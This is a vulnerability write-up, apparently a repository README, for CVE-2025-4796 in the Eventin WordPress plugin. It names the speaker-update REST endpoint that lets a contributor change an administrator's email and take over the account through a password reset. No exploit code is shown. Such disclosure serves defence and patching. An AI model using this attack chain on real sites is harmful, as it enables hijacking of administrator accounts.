# CVE-2025-4796
Eventin &lt;= 4.0.34 - Authenticated (Contributor+) Privilege Escalation via User Email Change/Account Takeover

# üõ°Ô∏è Eventin <= 4.0.34 - Authenticated (Contributor+) Privilege Escalation (CVE-2025-4796)

## üìå Overview
This repository documents a privilege escalation vulnerability in the Eventin WordPress plugin (<= 4.0.34) that allows an authenticated user with Contributor+ capabilities to change arbitrary users' email addresses via the plugin's speaker update API. By changing an administrator's email, an attacker can trigger a password reset and gain account takeover.

- Vulnerable component: Eventin WordPress plugin (Eventin\Speaker\Api\SpeakerController::update_item)
- Affected versions: <= 4.0.34
- CVE: CVE-2025-4796
- CVSS: 8.8 (High)




- Active installations: 10,000+

## ‚ö†Ô∏è Vulnerability Details
Eventin does not properly validate the identity or capability of the caller before updating speaker/user details (specifically email). An attacker who is authenticated as a contributor (or higher) can change the email address of other users ‚Äî including administrators ‚Äî using the plugin REST endpoint:
- PUT /wp-json/eventin/v2/speakers/<speaker_id>

Once the email is changed to an attacker-controlled address, the standard WordPress password reset flow can be used to take over the account.
